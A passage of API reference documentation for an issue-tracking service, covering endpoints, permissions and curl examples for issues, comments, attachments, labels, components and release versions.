curl -s "$BASE/workspaces/$WS/projects/$PROJ/issues?labelId=$L1&labelId=$L2&labelMatch=all" \
  -H "Authorization: Bearer $TOKEN"

curl -s "$BASE/workspaces/$WS/projects/$PROJ/issues?componentId=$COMP" \
  -H "Authorization: Bearer $TOKEN"

curl -s "$BASE/workspaces/$WS/projects/$PROJ/issues?fixVersionId=$VER" \
  -H "Authorization: Bearer $TOKEN"

curl -s "$BASE/workspaces/$WS/projects/$PROJ/issues?sprintId=$SPRINT" \
  -H "Authorization: Bearer $TOKEN"
```

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `/workspaces/{wsId}/projects/{pId}/issues` | `issue.create` | Create. `201` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/issues?statusId=&assigneeId=&priorityId=&componentId=&labelId=&labelMatch=&fixVersionId=&sprintId=&noSprint=&excludeDone=&page=&size=` | member | List with optional filters — **dual shape** (see above) |
| `GET` | `/workspaces/{wsId}/projects/{pId}/issues/{number}` | member | Get one |
| `GET` | `/workspaces/{wsId}/projects/{pId}/issues/{number}/children` | member | Direct children of the issue, in board order |
| `GET` | `/workspaces/{wsId}/projects/{pId}/issues/{number}/history?page=&size=` | member | Field-level change history (paginated, oldest first) |
| `PATCH` | `/workspaces/{wsId}/projects/{pId}/issues/{number}` | per field | Partial update with optimistic locking — see [Permissions on issue writes](#permissions-on-issue-writes) |
| `POST` | `/workspaces/{wsId}/projects/{pId}/issues/{number}/rank` | `issue.rank` | Move the issue in the backlog/board [rank](#sprints--backlog), optionally into or out of a sprint (`sprint.assign` as well when it does) |
| `DELETE` | `/workspaces/{wsId}/projects/{pId}/issues/{number}` | `issue.delete` | Delete issue + comments + attachments. `204` |

**Create** — `title`, `typeId` and `statusId` are required (the type must be offered by the project's type set, the status must belong to the project's [workflow](#project-configuration)); `priorityId` must be offered by the project's priority set and defaults to the set's default when omitted; `parentId` links the issue to a parent in the same project — rejected with `422` if the parent is unknown, in another project, or its type's [hierarchy level](#project-configuration) is not strictly greater than this issue's type level; `assigneeId` must be a workspace member. `fields` carries custom field values keyed by field id (value shapes per [field type](#project-configuration)) — required fields of the project's field set must be present, fields outside the set or archived are rejected with `422`. `labelIds` attaches workspace [labels](#labels) (duplicates are de-duped); an unknown, foreign-workspace or archived label id — or more than 20 distinct ids — is rejected with `422`. `componentId` files the issue under a [component](#components) of this project; an unknown, foreign-project or archived component is a `422`, and when the component has auto-assign the lead may become the assignee (see [auto-assign](#components)). `fixVersionIds` and `affectsVersionIds` link [versions](#versions) of this project in the two independent roles — "ships in" and "is broken in"; an unknown, foreign-project or archived version, or more than 20 distinct ids **per link type**, is a `422` (linking an already-*released* version is allowed on purpose). `sprintId` files the issue straight into a [sprint](#sprints--backlog) of this project — an unknown, foreign-project or *completed* sprint is a `422`, and omitting it means the backlog. `storyPoints` is the native estimate: `0`–`999` with at most 2 decimals (`422` otherwise), where `null`/omitted means **unestimated**, which is deliberately not the same as `0`. A new issue is always appended to the **bottom** of the ranked backlog:

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/issues \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{
  "title": "Rate-limit authentication endpoints",
  "description": "Login accepts unlimited attempts…",
  "typeId": "…", "statusId": "…",
  "priorityId": "…",
  "assigneeId": "…",
  "dueDate": "2026-07-24",
  "labelIds": ["0198c4a1-…"],
  "componentId": "0198d5b2-…",
  "fixVersionIds": ["0198e6c3-…"],
  "affectsVersionIds": ["0198e6c3-…"],
  "sprintId": "0198f7d4-…",
  "storyPoints": 5,
  "fields": { "e1b2…": 5, "f3c4…": "critical" }
}'
```

> `clearSprint` and `clearStoryPoints` are accepted on **create** for payload symmetry with the update body, but they do nothing there — a brand-new issue has nothing to clear, and omitting `sprintId`/`storyPoints` already means "backlog" / "unestimated". They only carry meaning on `PATCH`.

```json
{
  "id": "…", "number": 18, "key": "DEMO-18",
  "title": "Rate-limit authentication endpoints",
  "description": "Login accepts unlimited attempts…",
  "type":   { "id": "…", "name": "Task", "color": "#3B82F6", "icon": "task", "position": 1, "hierarchyLevel": 1 },
  "status": { "id": "…", "name": "To Do", "color": "#6B7280", "category": "TODO", "position": 0 },
  "priority": { "id": "…", "name": "High", "color": "#EA580C", "icon": "chevron-up", "position": 1 },
  "assignee": { "id": "…", "displayName": "Ada Lovelace", "avatarUrl": null },
  "reporter": { "id": "…", "displayName": "Ada Lovelace", "avatarUrl": null },
  "parentId": null,
  "parentKey": null,
  "parentTitle": null,
  "parentTypeId": null,
  "childCount": 0,
  "doneChildCount": 0,
  "dueDate": "2026-07-24",
  "labels": [ { "id": "0198c4a1-…", "name": "needs-design", "color": "#0EA5A4", "archived": false } ],
  "component": { "id": "0198d5b2-…", "name": "Billing", "archived": false },
  "fixVersions": [ { "id": "0198e6c3-…", "name": "2.4.0", "released": false, "archived": false } ],
  "affectsVersions": [ { "id": "0198e6c3-…", "name": "2.3.1", "released": true, "archived": false } ],
  "sprint": { "id": "0198f7d4-…", "name": "Sprint 7", "state": "ACTIVE" },
  "storyPoints": 5,
  "fields": [ { "fieldId": "e1b2…", "value": 5 }, { "fieldId": "f3c4…", "value": "critical" } ],
  "version": 0,
  "createdAt": "…", "updatedAt": "…",
  "closedAt": null
}
```

`sprint` is `null` when the issue sits in the backlog, and `storyPoints` is `null` when it is unestimated (never `0` — "we didn't estimate it" and "it's free" are different statements). The issue's **rank** is deliberately *not* exposed: it is server-written only, and a client places an issue by naming its neighbours instead (see [rank](#sprints--backlog)).

`closedAt` is the **closed date** — server-maintained and never accepted on a request. It is stamped when the issue enters a status whose `category` is `DONE` (creating an issue directly in a DONE status stamps it immediately) and cleared back to `null` when the issue leaves a DONE-category status. Only a change of status **category** re-evaluates it: moving between two different DONE statuses keeps the original stamp, and an update that doesn't touch the status leaves it alone. The stamp writes no [history](#issues) entry of its own — the `status` entry already records the transition.

**Update & optimistic locking** — send any subset of `title`, `description`, `typeId`, `statusId`, `priorityId`, `assigneeId`, `dueDate`, `labelIds`, `componentId`, `fixVersionIds`, `affectsVersionIds`, `sprintId`, `storyPoints`, `fields`, plus the `version` you last read. If the issue changed since, you get `409 Conflict` — re-fetch and retry. Omitting `version` skips the check (last write wins). To unset a nullable core field send `clearAssignee: true` / `clearDueDate: true` — a plain `null` can't be told apart from an omitted field (ignored when the id/date is also given). A `parentId` sets or changes the parent and `clearParent: true` detaches it (same convention); an illegal parent — unknown, in another project, self, a cycle, a [hierarchy-level](#project-configuration) violation, or a type change that conflicts with an existing parent or child edge — returns `422`. `labelIds`, `fixVersionIds` and `affectsVersionIds` are the **full-replacement** fields: when present the issue ends up carrying exactly those labels / versions-in-that-role, `[]` removes them all, and omitting one leaves it untouched (no clear-flag needed — `[]` is unambiguous); an already-attached archived label or version may stay, it just cannot be added. The two version roles are independent, so sending only `fixVersionIds` never touches the affects set, and the 20-per-issue cap is counted separately per role. `componentId` sets or changes the [component](#components) and `clearComponent: true` unsets it (the `assigneeId`/`clearAssignee` convention again); attaching an unknown, foreign-project or **archived** component is a `422`, though an issue already carrying an archived one stays editable — and component auto-assign never fires on an update. `sprintId` moves the issue into a [sprint](#sprints--backlog) of this project and `clearSprint: true` returns it to the backlog (the same nullable-scalar convention); sending **both** is a `400` — "put it in sprint X" and "take it out of every sprint" cannot both hold, so `sprintId` no longer wins silently, and this now matches the [rank endpoint](#sprints--backlog), which has always refused the same combination. An unknown, foreign-project or **completed** target sprint is a `422`, and so is changing or clearing the sprint of an issue whose **current** sprint is `COMPLETED` — a completed sprint's membership is frozen in both directions, though every other field of such an issue stays editable. `storyPoints` sets the estimate (`0`–`999`, at most 2 decimals — `422` otherwise) and `clearStoryPoints: true` marks the issue unestimated again; a real change writes one `storyPoints` history entry, a no-op writes none. Neither of them touches the issue's **rank** — that is the separate [rank endpoint](#sprints--backlog). Inside `fields` only the listed field ids change; JSON `null` clears a value (required fields cannot be cleared):

```bash
curl -X PATCH $BASE/workspaces/$WS/projects/$PROJ/issues/18 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"statusId": "…", "version": 3}'
```

**History** is paginated (oldest first) — the [envelope](#conventions) wraps entries of this shape in `content`:

```json
{ "id": "…", "field": "status", "oldValue": "To Do", "newValue": "In Progress",
  "changedById": "…", "changedByName": "Ada Lovelace", "createdAt": "…" }
```

Custom field changes appear with the field's display name in `field` and human-readable values (option labels rather than ids, user display names, `yes`/`no` for checkboxes). A [label](#labels) change is recorded once under `labels`, with the label names before and after comma-joined (a label **merge** deliberately writes no per-issue history — it can touch thousands of issues). A [component](#components) change is recorded under `component` with the old and new component names (a forced component **delete** writes no per-issue history either, for the same reason). [Version](#versions) changes are recorded per role, under `fixVersions` and `affectsVersions`, with the names before and after comma-joined — and, for the same "one request must stay bounded" reason, a version **delete** (forced or remapped) and a release-time `moveUnresolvedToVersionId` write no per-issue history. A [sprint](#sprints--backlog) change is recorded under `sprint` with the old and new sprint names (`null` when there is none), and a story-point change under `storyPoints` — while a **rank** change writes nothing at all, because positional churn would drown the log.

### Permissions on issue writes

Issue writes are gated per action, not per endpoint, and each `403` [names the permission it wanted](#what-a-403-says):

| Request | Permissions checked |
|---|---|
| `POST …/issues` | `issue.create`; **plus** `issue.assign` when the body carries `assigneeId`, **plus** `sprint.assign` when it carries `sprintId` |
| `PATCH …/issues/{number}` | `issue.edit` for ordinary fields, `issue.transition` for `statusId`, `issue.assign` for the assignee, `sprint.assign` for the sprint — any combination, in one request |
| `POST …/issues/{number}/rank` | `issue.rank`; **plus** `sprint.assign` when the call also moves the issue into or out of a sprint |
| `DELETE …/issues/{number}` | `issue.delete` (an `issue.delete:own` grant covers issues you **reported**) |

**Only fields that are present *and actually changing* are checked.** Clients send whole-form patches, so a `PATCH` that echoes ten unchanged fields and moves the status needs `issue.transition` and nothing else — an unchanged value never costs a permission. Two details follow from that:

- `issue.edit` covers everything without a more specific key: `title`, `description`, `typeId`, `priorityId`, `dueDate`, `labelIds`, `componentId`, `parentId`, `fixVersionIds`, `affectsVersionIds`, `storyPoints` and custom `fields`. An `issue.edit:own` grant satisfies it on issues you **reported**.
- A non-empty `fields` map is checked on **presence**, not on change — re-sending a custom field value identical to the stored one still requires `issue.edit`. Send `fields` only when you mean to write it.

**When more than one is missing, the `403` names the first in catalog order** — `issue.edit` → `issue.transition` → `issue.assign` → `sprint.assign`. Every check runs before the first mutation, so a rejected request changes nothing at all; and it runs before the archived-project `409` too, so on an archived project the permission failure is what you see.

Assigning has a second half that is *not* about the caller: the target must hold `issue.assignable`, and failing that is a [`422`, not a `403`](#assignability--a-422-not-a-403).

## Comments

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `…/issues/{number}/comments` | `comment.create` | Create (`{"body"}`). `201` |
| `GET` | `…/issues/{number}/comments?page=&size=` | member | List (deleted comments excluded; paginated, oldest first) |
| `PATCH` | `…/issues/{number}/comments/{commentId}` | `comment.edit` (own) | Edit (`{"body"}`) |
| `DELETE` | `…/issues/{number}/comments/{commentId}` | `comment.delete` | Soft delete. `204` |

`@DisplayName` mentions in a comment body notify the mentioned workspace members.

**Commenting is a permission now.** It used to be ungated — any workspace member could comment on any issue in any project. It is `comment.create`, granted by the project `MANAGER`, `TEAM_LEAD`, `MEMBER` and `COMMENTER` roles, so everyone who could comment before still can; what changed is that a project can now have a role that reads but does not comment. Reading the list needs nothing beyond project access.

**Editing is own-only, at every role.** `comment.edit` is the one permission in the catalog that can *only* be granted own-only — putting words in someone else's mouth is not a capability this product ships, so `comment.edit:own` is what even a project administrator holds. Editing another person's comment is a `403` for everybody, exactly as before; the difference is that the refusal now [names the permission](#what-a-403-says) instead of being an empty `403` with no body at all.

**Deleting is own — or, for a project administrator, anyone's.** `comment.delete` is granted own-only to `TEAM_LEAD`, `MEMBER` and `COMMENTER` (your own comments, as before) and **unrestricted** to the project `MANAGER`. That is a new user-visible capability: until this release nobody could delete another person's comment. A workspace `OWNER`/`ADMIN` who is not a member of the project does **not** get it. Deleting is soft — the comment disappears from the list rather than being erased.

Both refusals precede the archived-project check, so on an archived project a caller who lacks the permission gets the `403` rather than `409 "Project is archived"` — [permission first, project state second](#what-a-403-says). An author acting on their own comment in an archived project still gets the `409`.

Listing is paginated (oldest first) — the [envelope](#conventions) wraps comments of this shape in `content`:

```json
{ "id": "…", "authorId": "…", "authorName": "Ada Lovelace", "body": "Looks good!",
  "createdAt": "…", "updatedAt": "…" }
```

## Attachments

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `…/issues/{number}/attachments` | `attachment.create` | Upload, `multipart/form-data` with a `file` field. `201` |
| `GET` | `…/issues/{number}/attachments` | member | List |
| `GET` | `…/issues/{number}/attachments/{attachmentId}` | member | Download (binary, `Content-Disposition: attachment`) |
| `DELETE` | `…/issues/{number}/attachments/{attachmentId}` | `attachment.delete` | Delete file + metadata. `204` |

Deletion honours the [ownership modifier](#the-own-suffix): an `attachment.delete:own` grant covers the files **you** uploaded, the unrestricted grant covers anyone's — which is the project `MANAGER`'s reach, i.e. the previous "uploader or `MANAGER`" rule spelled out. The permission is checked **before** the archived-project `409`, so on an archived project a caller without it now sees the [`403`](#what-a-403-says).

Uploads are validated in two ways: a **per-file size limit** (default 20 MB — `413 Payload Too Large` when exceeded; a separate, larger servlet ceiling rejects grossly oversized bodies) and a **file-extension allow-list** (images, PDF, common Office/text formats and `zip` by default — a disallowed extension returns `415 Unsupported Media Type`). The stored/returned `contentType` is derived from the filename on the server; the client-supplied content type is ignored.

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/issues/18/attachments \
  -H "Authorization: Bearer $TOKEN" -F "file=@screenshot.png"
```

```json
{ "id": "…", "filename": "screenshot.png", "sizeBytes": 48213, "contentType": "image/png",
  "uploadedById": "…", "uploadedByName": "Ada Lovelace", "createdAt": "…" }
```

## Labels

Free-form, colored tags that live in the **workspace** and are reusable across all of its projects. Labels are *content*, not configuration: they never appear in a project's [config](#project-configuration), and any workspace member can mint one on the spot. Every endpoint requires workspace membership — a non-member, or an unknown workspace, gets `404` (never `403`); `403` is reserved for a member who lacks the permission, and it [names it](#what-a-403-says).

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/labels?includeArchived=false&withUsage=false` | member | The workspace's labels, ordered by name |
| `POST` | `/workspaces/{wsId}/labels` | `label.create` | Create a label. `201` |
| `PATCH` | `/workspaces/{wsId}/labels/{labelId}` | `label.manage` (own = yours) | Rename / recolor / describe |
| `POST` | `/workspaces/{wsId}/labels/{labelId}/archive` | `label.manage` (unrestricted) | Archive (allowed even while in use) |
| `POST` | `/workspaces/{wsId}/labels/{labelId}/unarchive` | `label.manage` (unrestricted) | Restore an archived label |
| `POST` | `/workspaces/{wsId}/labels/{labelId}/merge` | `label.manage` (unrestricted) | Merge other labels into this one |
| `DELETE` | `/workspaces/{wsId}/labels/{labelId}?force=false` | `label.manage` (unrestricted) | Delete. `204` |
| `GET` | `/workspaces/{wsId}/labels/{labelId}/usage` | member | `{"issueCount": 12}` |

**One key, two widths.** `label.manage` is granted **unrestricted** to workspace `OWNER`/`ADMIN` and **own-only** to `MEMBER`, and the endpoints ask for different widths: renaming/recoloring/describing accepts the own-only grant ([`:own`](#the-own-suffix) = labels you created), while archive / unarchive / merge / delete require the unrestricted grant and are refused even on a label you made yourself. That is the same rule the old "`OWNER`/`ADMIN`, or the creator" wording described; it is simply stated in permissions now, and the `403` names the key.

**List** — ordered by name (case-insensitive). Archived labels are hidden unless `includeArchived=true`. `issueCount` is `null` unless you ask for `withUsage=true` (one grouped query for the whole list, so the picker doesn't pay for counts it won't show):

```json
{ "id": "0198c4a1-…", "name": "needs-design", "color": "#0EA5A4",
  "description": "Blocked on a design decision", "archived": false,
  "createdById": "…", "createdByName": "Ada Lovelace",
  "issueCount": 12, "createdAt": "…", "updatedAt": "…" }
```

**Create** — the body is `{"name", "color?", "description?"}` and needs `label.create`, which every built-in workspace role grants, so any workspace member may post it (self-serve tagging is the point):

- `name` is required and normalized server-side — Unicode NFC, invisible control/format characters stripped, surrounding whitespace trimmed, internal whitespace runs collapsed to a single space. Spaces are allowed. The normalized result must be 1–60 characters, else `400`.
- Names are **unique per workspace, case-insensitively**, and archived labels keep their name slot — a collision is a `409` (see below). Casing is preserved for display.
- `color` is `#RRGGBB` or `#RRGGBBAA` (`400` otherwise). Omit it and the server picks a deterministic swatch derived from the name, so the same name always looks the same.
- `description` is optional, max 200 chars, blank is stored as `null`.
- A workspace that has reached its label limit (1000) returns `422` — archive or delete some first. Archived labels count toward the cap (they keep their name slot).

```bash
curl -X POST $BASE/workspaces/$WS/labels \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name": "needs-design", "color": "#0EA5A4"}'
```

**Duplicate names (`409` + `existingId`)** — both on create and on a rename that races another one, the conflict body carries the id of the label that already owns the name, so a client can attach the existing label instead of re-listing the catalog:

```json
{ "type": "about:blank", "title": "Conflict", "status": 409,
  "detail": "A label named 'needs-design' already exists in this workspace",
  "existingId": "0198c4a1-…" }
```

An **archived** label produces the same `409` (with `detail` pointing at it) — unarchive or rename it rather than creating a twin.

**Update** — `PATCH` takes `{"name?", "color?", "description?"}`; `null`/omitted fields are left unchanged. Allowed to a workspace `OWNER`/`ADMIN` **or the label's own creator**; another member gets `403`. Changing only the casing of the name keeps the same unique slot; any other rename onto a taken name is the `409` above.

**Archive vs delete** — archiving is the recommended, non-destructive option and is always allowed, even while the label is in use: it disappears from pickers and from the default catalog listing, existing attachments survive (and come back on the issue with `"archived": true` so a client can dim them), and it can no longer be added to an issue (`422`). `DELETE` is `OWNER`/`ADMIN` only and returns `409` while the label is attached to any issue, unless you pass `force=true`, which detaches it everywhere and then deletes it. There is no remap-on-delete — use merge for that.

**Merge** — `POST …/labels/{targetId}/merge` with `{"sourceIds": ["…", "…"]}` folds the sources **into** the label in the path: every issue carrying a source ends up carrying the target, duplicates collapse, and the source labels are deleted. `sourceIds` must be non-empty and at most 50 (`400`); a source equal to the target, or one that doesn't resolve inside this workspace, is a `422`. Merge (and a forced delete) also re-points issues in **archived** projects — the label catalog is workspace-level metadata above the per-project freeze.

```json
{ "targetId": "0198c4a1-…", "mergedLabelCount": 2, "reassignedIssueCount": 37 }
```

No per-issue history is written for a merge (it can touch thousands of issues) — this response, plus the target's bumped `updatedAt`, is the record.

**Using labels** — attach them with `labelIds` when creating or updating an [issue](#issues) (full-replacement set), filter the board/backlog with `?labelId=&labelMatch=`, and query them in [HQL](#search-hql) as `label` (alias `labels`). An issue's own labels come back in `IssueResponse.labels` as `{id, name, color, archived}`, ordered by name, `[]` when there are none. An issue may carry at most 20 labels.

## Components

Curated modules of a **single project** — "Billing", "Mobile app", "API" — each with an optional **lead** and an optional create-time **auto-assign**. Like labels they are *content*, not configuration: they never appear in a project's [config](#project-configuration). Unlike labels they are project-owned (two projects may each have their own "Billing") and only curators may edit the catalog. An issue carries at most one component.

Reading needs project membership; writing needs [`component.manage`](#permissions) — held by a project `MANAGER` and, across every project of their workspace, by a workspace `OWNER`/`ADMIN` who need not be a project member. A missing workspace, a missing project or a non-member all give `404`, never `403`; `403` is reserved for a member without the permission, and [names it](#what-a-403-says).

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/projects/{pId}/components?includeArchived=false&withUsage=false` | member | The project's components, ordered by name |
| `POST` | `/workspaces/{wsId}/projects/{pId}/components` | `component.manage` | Create a component. `201` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/components/{componentId}` | member | Get one |
| `PATCH` | `/workspaces/{wsId}/projects/{pId}/components/{componentId}` | `component.manage` | Rename / re-lead / describe / toggle auto-assign |
| `POST` | `/workspaces/{wsId}/projects/{pId}/components/{componentId}/archive` | `component.manage` | Archive (allowed even while in use) |
| `POST` | `/workspaces/{wsId}/projects/{pId}/components/{componentId}/unarchive` | `component.manage` | Restore an archived component |
| `DELETE` | `/workspaces/{wsId}/projects/{pId}/components/{componentId}?force=false` | `component.manage` | Delete. `204` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/components/{componentId}/usage` | member | `{"issueCount": 12}` |

**List** — ordered by name (case-insensitive). Archived components are hidden unless `includeArchived=true`. `issueCount` is `null` unless you ask for `withUsage=true` (one grouped query for the whole list, so the picker doesn't pay for counts it won't show); it is also `null` on `GET …/components/{componentId}`, which is what the `/usage` endpoint is for:

```json
{ "id": "0198d5b2-…", "name": "Billing",
  "description": "Invoicing, plans and payment provider glue",
  "leadId": "…", "leadName": "Ada Lovelace", "leadAvatarUrl": null,
  "autoAssign": true, "archived": false,
  "issueCount": 12, "createdAt": "…", "updatedAt": "…" }
```

**Create** — the body is `{"name", "description?", "leadId?", "autoAssign?"}`:

- `name` is required and normalized server-side — Unicode NFC, invisible control/format characters stripped, surrounding whitespace trimmed, internal whitespace runs collapsed to a single space. The normalized result must be 1–80 characters, else `400` (the payload itself is additionally capped at 200 characters as a cheap guard).
- Names are **unique per project, case-insensitively**, and archived components keep their name slot — a collision is a `409`. Casing is preserved for display. The same name in a *different* project is perfectly fine.
- `description` is optional, max 500 chars (`400` beyond), blank is stored as `null`.
- `leadId` is optional and must be a **member of this workspace** — anything else (unknown user, another tenant's user, a former member) is `422 "Unknown lead"`.
- `autoAssign` defaults to `false` and requires a lead: turning it on with none is `422`.
- A project that has reached its component limit (500) returns `422` — archive or delete some first. **Archived components count toward the cap** (they keep their unique name slot and still show up under `includeArchived=true`), so create → archive → repeat cannot get you past it.

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/components \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name": "Billing", "leadId": "…", "autoAssign": true}'
```

**Duplicate names (`409`)** — on create, and on a rename that races another one:

```json
{ "type": "about:blank", "title": "Conflict", "status": 409,
  "detail": "A component named 'Billing' already exists in this project" }
```

An **archived** component holding the name produces the same `409` (`"An archived component already uses this name — unarchive or rename it"`). Unlike a [label](#labels) conflict there is **no** `existingId` extension — components have no on-the-fly create to recover from, so the client just re-reads the catalog.

**Update** — `PATCH` takes `{"name?", "description?", "leadId?", "clearLead?", "autoAssign?"}`; `null`/omitted fields are left unchanged. `leadId` sets the lead and `clearLead: true` unsets it (the `assigneeId`/`clearAssignee` convention — a plain `null` can't be told apart from an omitted field). Changing only the casing of the name keeps the same unique slot; any other rename onto a taken name is the `409` above. The *resulting* state must still satisfy "auto-assign needs a lead", so clearing the lead of an auto-assigning component is `422` unless you turn `autoAssign` off in the same call.

**Auto-assign** — when an issue is **created** with a component that has `autoAssign` **and** a lead, and the request supplies no `assigneeId`, the issue is assigned to that lead. An explicit `assigneeId` always wins. A lead who has since left the workspace is skipped silently (the issue is simply created unassigned — a stale lead must never fail issue creation). Auto-assign **never** fires on update: changing an issue's component later must not silently reassign someone's work.

**Archive vs delete** — archiving is the recommended, non-destructive option and is always allowed, even while the component is in use: it disappears from pickers and from the default catalog listing, existing assignments survive (and come back on the issue with `"archived": true` so a client can dim them), it can no longer be attached to an issue (`422`), and it is reversible. `DELETE` returns `409` while the component is on any issue (the message states the count) unless you pass `force=true`, which **clears the component on every issue that carried it** and then deletes the row. There is no remap-to-another-component, and neither operation writes per-issue history — a forced delete can touch thousands of issues.

**Archived projects.** Every management call (create, update, archive, unarchive, delete) on a component of an **archived project** returns `409 "Project is archived"` — the catalog is frozen exactly as issue edits are. Reads keep working.

**Using components** — set `componentId` when creating or updating an [issue](#issues) (`clearComponent: true` unsets it), filter the board/backlog with `?componentId=`, and query them in [HQL](#search-hql) as `component` (alias `components`). An issue's own component comes back in `IssueResponse.component` as `{id, name, archived}`, or `null`. **`component.manage` governs the catalog, not the assignment**: filing an issue under a component is an ordinary issue edit and needs [`issue.edit`](#permissions-on-issue-writes), never `component.manage`.

## Versions

A **single project's** release plan — "2.4.0", "Sprint 12 release" — with a fully reversible lifecycle. Each version can be linked to issues in two independent roles: **fix** ("this change ships in that release") and **affects** ("this defect exists in that release"). Like labels and components they are *content*, not configuration: they never appear in a project's [config](#project-configuration). Two projects may each own a "2.4.0".

Reading needs project membership; writing needs [`version.manage`](#permissions) — held by a project `MANAGER` and, across every project of their workspace, by a workspace `OWNER`/`ADMIN` who need not be a project member. A missing workspace, a missing project or a non-member all give `404`, never `403`; `403` is reserved for a member without the permission, and [names it](#what-a-403-says). As with components, the permission governs the **catalog**: linking a version to an issue is [`issue.edit`](#permissions-on-issue-writes).

**The project's [delivery capabilities](#delivery-capabilities) change nothing here.** A project with `releases: false` still creates, lists, links and returns versions exactly as one with `releases: true` does — the capability hides the Releases page and the fix/affects pickers in the UI, and nothing else.

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/projects/{pId}/versions?includeArchived=false&includeReleased=true` | member | The project's release plan, in Releases-page order |
| `POST` | `/workspaces/{wsId}/projects/{pId}/versions` | `version.manage` | Create a version. `201` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}` | member | Get one |
| `PATCH` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}` | `version.manage` | Rename / describe / re-plan the date |
| `POST` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}/release` | `version.manage` | Ship it (body optional) |
| `POST` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}/unrelease` | `version.manage` | Undo a release (nothing is lost) |
| `POST` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}/archive` | `version.manage` | Archive (allowed even while in use) |
| `POST` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}/unarchive` | `version.manage` | Restore an archived version |
| `DELETE` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}?force=false&remapToId=` | `version.manage` | Delete. `204` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/versions/{versionId}/usage` | member | Fix / affects / unresolved counts |

**List** — ordered the way a release page reads: **unreleased first**, then by `releaseDate` ascending with undated versions last, then by name (case-insensitive). Archived versions are hidden unless `includeArchived=true`; released ones are **included by default** (`includeReleased=true` — a release page without its shipped releases is useless), so pass `includeReleased=false` for a "what is still open" picker. Unlike labels and components there is no `withUsage` flag: the three counters are **always** filled, because they cost one grouped query for the whole list.

```json
{ "id": "0198e6c3-…", "name": "2.4.0",
  "description": "Billing rewrite + the new search bar",
  "releaseDate": "2026-09-01", "released": false, "releasedAt": null,
  "archived": false,
  "issueCount": 24, "doneIssueCount": 18, "affectsIssueCount": 3,
  "createdAt": "…", "updatedAt": "…" }
```

`issueCount` and `doneIssueCount` count **fix** links only (they are the progress bar's "18 / 24"); `affectsIssueCount` counts the affects links, which are triage information rather than progress.

**Create** — the body is `{"name", "description?", "releaseDate?"}`:

- `name` is required and normalized server-side — Unicode NFC, invisible control/format characters stripped, surrounding whitespace trimmed, internal whitespace runs collapsed to a single space. The normalized result must be 1–60 characters, else `400` (the payload itself is additionally capped at 200 characters as a cheap guard).
- Names are **unique per project, case-insensitively**, and archived versions keep their name slot — a collision is a `409` (`"An archived version already uses this name — unarchive or rename it"`). Casing is preserved for display. The same name in a *different* project is fine. As with [components](#components) there is **no** `existingId` extension on the conflict body.
- `description` is optional, max 500 chars (`400` beyond), blank is stored as `null`.
- `releaseDate` is optional and is only **the plan** — a version is always created unreleased. It must fall within `1000-01-01`…`9999-12-31`; anything outside that is a `422` (not a `400` like the name/length failures — the field is well-formed, its value is simply not storable).
- A project that has reached its version limit (500) returns `422` — delete some first. **Archived and released versions count toward the cap** (they keep their unique name slot and still show up under `includeArchived=true`), so create → archive → repeat cannot get you past it, and archiving does not free a slot.

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/versions \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name": "2.4.0", "releaseDate": "2026-09-01"}'
```

**Update** — `PATCH` takes `{"name?", "description?", "releaseDate?", "clearReleaseDate?"}`; `null`/omitted fields are left unchanged. `releaseDate` sets the planned date and `clearReleaseDate: true` unsets it (the `assigneeId`/`clearAssignee` convention — a plain `null` can't be told apart from an omitted field); it is bounds-checked exactly as on create (`422` outside `1000-01-01`…`9999-12-31`). Changing only the casing of the name keeps the same unique slot; any other rename onto a taken name is the `409` above. There is deliberately **no** `released` field here — the lifecycle moves only through the two calls below.

**Release** — `POST …/versions/{versionId}/release`, body **optional**: a bare `POST` (or `{}`) means "release it now, keeping the planned date". If neither the body nor the stored version carries a `releaseDate`, the server stamps **today** (server UTC date).

- Releasing a version that still has unresolved issues is **allowed on purpose** — a release with open work is a real, common state, and blocking it would only push teams to falsify the tracker.
- `moveUnresolvedToVersionId` optionally re-points the **fix** links of every issue in a non-DONE status to another version first; issues already in a DONE-category status stay on the released version. The target must be another version **of the same project**, **unreleased** and non-archived — anything else (including the version being released itself) is a `422`. Open work must never be moved onto a shipped release.
- A supplied `releaseDate` is bounds-checked like everywhere else (`422` outside `1000-01-01`…`9999-12-31`).
- Releasing an **already-released** version is a `409`, not a silent success: the flip is a conditional update, so a double-click can never run the destructive move twice.
- A `moveUnresolvedToVersionId` remap can also lose a race: if a concurrent issue edit adds the target version to one of the very issues being re-pointed, the re-created link collision surfaces as a **retryable `409`** ("Another change added this version to one of the same issues — retry"). The whole release is rolled back with it, so nothing is half-applied — just retry.

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/versions/$VER/release \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"moveUnresolvedToVersionId": "0198e6c4-…"}'
```

